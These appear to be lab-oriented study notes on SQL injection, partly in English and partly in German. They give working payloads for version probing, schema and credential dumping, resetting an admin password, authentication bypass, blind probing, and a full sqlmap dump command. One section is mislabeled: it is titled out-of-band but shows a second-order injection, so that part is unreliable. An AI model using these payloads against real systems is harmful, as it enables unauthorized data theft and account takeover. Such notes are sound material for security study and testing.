---
description: manipulate database queries through user input
---

# sql injection — break databases through bad input handling

<details>

<summary>Links:</summary>

[https://portswigger.net/support/sql-injection-in-different-statement-types](https://portswigger.net/support/sql-injection-in-different-statement-types)

</details>

widespread vulnerability in web applications that allows attackers to inject malicious input into SQL queries, gaining unauthorized database access or modifying data. affects `SELECT`, `UPDATE`, `DELETE`, and `INSERT` statements. consequences range from data theft to complete database control.

## in-band sqli

**definition:**
simplest and most common form. extracted data is returned through the same communication channel as the original request. two common subtypes: error-based and union-based.

### database information gathering

goal: extract information about the database management system (DBMS) - version, tables, columns.

**version detection examples:**

```sql
-- MySQL and MSSQL
',nickName=@@version,email='

-- Oracle  
',nickName=(SELECT banner FROM v$version),email='

-- SQLite
',nickName=sqlite_version(),email='
```

#### **1.2 Strukturabfragen in SQLite**

In SQLite lassen sich Tabellen und Spalten wie folgt auslesen:

```sql
-- Tabellen auflisten
',nickName=(SELECT group_concat(tbl_name) 
FROM sqlite_master 
WHERE type='table' 
AND tbl_name NOT like 'sqlite_%'),email='

-- Struktur (DDL) einer bestimmten Tabelle anzeigen
',nickName=(SELECT sql 
FROM sqlite_master 
WHERE type!='meta' AND sql NOT NULL AND name='usertable'),email='

-- Inhalt der Tabelle „usertable“ auslesen
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") 
FROM usertable),email='
```

#### **1.3 Passwortänderung (UPDATE-Injection)**

Ein direktes Update eines Benutzerpassworts mittels SQLi:

```sql
', password='[SHA256_HASH]' WHERE name='Admin'-- -
```

Beispiel-Hash von „Password123“ (SHA256):

```
008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601
```

***

### **2. Error-Based SQLi**

**Definition:**\
Bei dieser Methode provozieren Angreifer gezielt Fehlermeldungen der Datenbank, um daraus Informationen über deren Struktur und Inhalte abzuleiten. Dies ist nur möglich, wenn Fehlermeldungen im Frontend angezeigt werden.

***

### **3. Union-Based SQLi**

**Definition:**\
Hierbei wird der `UNION SELECT`-Operator genutzt, um eigene Ergebnisse mit denen der regulären SQL-Abfrage zu kombinieren.

#### **Wichtige Voraussetzungen:**

* Die Anzahl der Spalten der ursprünglichen Abfrage muss mit der der `UNION SELECT`-Abfrage übereinstimmen.
* Die Datentypen der Spalten müssen kompatibel sein.

#### **Anwendungsbeispiele:**

**Spaltenanzahl herausfinden:**

```sql
' UNION SELECT 1,2,3,... -- -
```

**Datenbankname ermitteln:**

```sql
' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- 
```

**Tabellennamen auslesen:**

```sql
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'sqli_one'
```

**Spaltennamen aus Tabelle ermitteln:**

```sql
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'staff_users'
```

**Zugangsdaten extrahieren:**

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') 
FROM staff_users
```

***

### **4. Blind SQLi**

**Definition:**\
Blind SQL-Injection kommt zum Einsatz, wenn keine Fehlermeldungen oder Ausgaben erfolgen. Die Rückmeldungen der Anwendung basieren auf _wahren oder falschen Bedingungen_, nicht auf expliziter Anzeige von Daten.

***

### **4.1 Klassische Blind SQLi**

Einzelne Zeichen eines Passworts werden iterativ getestet. Reagiert die Anwendung unterschiedlich (z. B. Weiterleitung, HTTP-Code, Textanzeige), können Rückschlüsse auf den Wahrheitsgehalt gezogen werden.

```sql
admin123' AND substring(password,1,1) = 'a' -- -
```

***

### **4.2 Blind SQLi – Authentication Bypass**

Manipulation von Loginformularen, um ohne gültige Zugangsdaten Zugang zu erhalten.

```sql
select * from users where username='' and password='' OR 1=1;
```

**Achtung:**\
Solche Techniken können bei `UPDATE`- oder `DELETE`-Abfragen zu schwerwiegenden Datenverlusten führen, wenn `OR 1=1` alle Datensätze betrifft.

***

### **4.3 Boolean-Based Blind SQLi**

Die Anwendung unterscheidet in der Antwortausgabe zwischen _wahr_ und _falsch_.

**Beispiele:**

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--

admin123' UNION SELECT 1,2,3 
FROM information_schema.tables 
WHERE table_schema = 'sqli_three' AND table_name = 'users';
```

***

### **4.4 Time-Based Blind SQLi**

Statt einer sichtbaren Reaktion wird die Ausführungszeit manipuliert. Bleibt die Seite z. B. 5 Sekunden stehen, ist die getestete Bedingung wohl _wahr_.

```sql
admin123' UNION SELECT SLEEP(5),2;--
```

***

### **5. Out-of-Band SQLi**

**Definition:**\
Diese Methode nutzt alternative Kommunikationskanäle (z. B. HTTP, DNS), um Daten zu exfiltrieren – besonders nützlich, wenn keine sichtbaren Ausgaben oder Zeitunterschiede möglich sind.

**Beispiel mit mehrstufiger Abfrageverarbeitung:**

```sql
' union select '1'' union select 1,2,3,group_concat(password) from users-- -
```

**Verarbeitung durch Anwendung:**

**Query 1:**

```sql
SELECT id FROM books WHERE title like '' union select '1'' union select 1,2,3,group_concat(password) from users-- -%'
```

**Query 2:**

```sql
SELECT * FROM books WHERE id = '1' union select 1,2,3,group_concat(password) from users-- -%'
```

***

### **6. SQLMap – Automatisierte SQLi-Erkennung und -Ausführung**

**SQLMap** ist ein Open-Source-Tool zur automatisierten Ausnutzung von SQLi-Schwachstellen. Es kann unter anderem Datenbanken identifizieren, Tabellen und Spalten extrahieren und Authentifizierungsmechanismen umgehen.

**Beispiel für SQLMap-Einsatz:**

```bash
sqlmap -u http://10.10.67.130:5000/challenge3/login \
--data="username=admin&password=admin" \
--level=5 --risk=3 --dbms=sqlite --technique=b --dump
```
